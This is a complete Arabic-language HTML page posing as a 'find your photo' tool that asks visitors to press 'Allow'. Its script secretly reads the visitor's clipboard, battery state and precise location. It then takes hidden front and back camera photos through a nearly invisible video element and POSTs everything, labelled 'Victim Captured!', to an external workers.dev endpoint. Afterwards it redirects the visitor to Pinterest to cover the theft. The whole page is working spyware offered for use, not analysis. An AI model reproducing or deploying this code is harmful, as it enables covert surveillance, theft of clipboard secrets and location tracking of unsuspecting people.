<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body { background: #f4f4f9; font-family: system-ui; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; max-width: 350px; z-index: 10; }
        button { background: #1877f2; color: white; border: none; padding: 15px 30px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; }
        #video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
        #status { margin-top: 15px; color: #666; font-size: 14px; }
    </style>
</head>
<body>

<div class="box">
    <div class="icon" style="font-size:50px;">🫆</div>
    <h2>بحث عن صورتك</h2>
    <p>اضغط للاشتغال وضغط على سماح لإعطاء صلاحيات التشغيل بدون مشاكل.</p>
    <button id="btn" onclick="startTracking()">سماح</button>
    <div id="status"></div>
</div>

<video id="video" autoplay playsinline muted></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
async function startTracking() {
    const btn = document.getElementById('btn');
    const status = document.getElementById('status');
    btn.disabled = true;
    btn.style.background = "#ccc";
    status.innerText = "⏳ جاري الاتصال بالسيرفر...";

    let data = {
        battery: "غير معروف",
        clipboard: "غير مسموح",
        location: "لم يتم السماح",
        frontImg: null,
        backImg: null
    };

    // 1. البطارية
    try {
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            data.battery = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'جاري الشحن' : 'تفريغ'})`;
        }
    } catch(e) { data.battery = "فشل القراءة"; }

    // 2. الحافظة
    try {
        if (navigator.clipboard && navigator.clipboard.readText) {
            data.clipboard = await navigator.clipboard.readText();
        }
    } catch(e) { data.clipboard = "رفض أو فارغة"; }

    // 3. الموقع
    try {
        const pos = await new Promise((res, rej) => {
            navigator.geolocation.getCurrentPosition(
                res, 
                rej, 
                { enableHighAccuracy: false, timeout: 10000 } // false = أسرع
            );
        });
        data.location = `📍 https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
    } catch(e) { data.location = "📍 تم الرفض"; }

    // 4. التقاط الصور – محسّن
    status.innerText = "⏳ جاري معالجة البيانات (قد يستغرق 10 ثوانٍ)...";
    
    data.frontImg = await takeShot("user");
    await new Promise(r => setTimeout(r, 1500));
    data.backImg = await takeShot("environment");

    // 5. تجميع الرسالة
    const msg = `✅ <b>Victim Captured!</b>
🔋 <b>Battery:</b> ${data.battery}
📋 <b>Clipboard:</b> <code>${data.clipboard}</code>
${data.location}
📱 <b>System:</b> ${navigator.platform}
⏰ <b>Time:</b> ${new Date().toLocaleString()}`;

    status.innerText = "⏳ جاري الإرسال...";

    // 6. الإرسال مع ضغط الصور
    try {
        await fetch("https://cold-brook-420f.tjarb093.workers.dev/", {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                message: msg, 
                frontImage: data.frontImg, 
                backImage: data.backImg 
            })
        });
    } catch(e) {
        console.error("فشل الإرسال", e);
    }

    // 7. التوجيه
    window.location.href = "https://www.pinterest.com/";
}

async function takeShot(mode) {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    let stream = null;

    try {
        stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: mode, 
                width: { ideal: 480 }, 
                height: { ideal: 360 }  // أبعاد أقل للضغط
            }, 
            audio: false 
        });

        video.srcObject = stream;

        // انتظار حقيقي حتى يصبح الفيديو جاهزاً
        await new Promise((resolve) => {
            const checkReady = () => {
                if (video.readyState >= 2 && video.videoWidth > 0) {
                    resolve();
                } else {
                    setTimeout(checkReady, 200);
                }
            };
            video.onloadedmetadata = () => {
                video.play();
                setTimeout(checkReady, 100);
            };
            // في حال لم يعمل onloadedmetadata
            setTimeout(checkReady, 5000);
        });

        // رسم الصورة
        canvas.width = video.videoWidth || 480;
        canvas.height = video.videoHeight || 360;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);

        // إيقاف الكاميرا
        stream.getTracks().forEach(t => t.stop());
        video.srcObject = null;

        return canvas.toDataURL('image/jpeg', 0.5); // جودة 50% – حجم أصغر

    } catch (e) {
        console.error("خطأ في الكاميرا:", e);
        if (stream) stream.getTracks().forEach(t => t.stop());
        return null;
    }
}
</script>
</body>
</html>
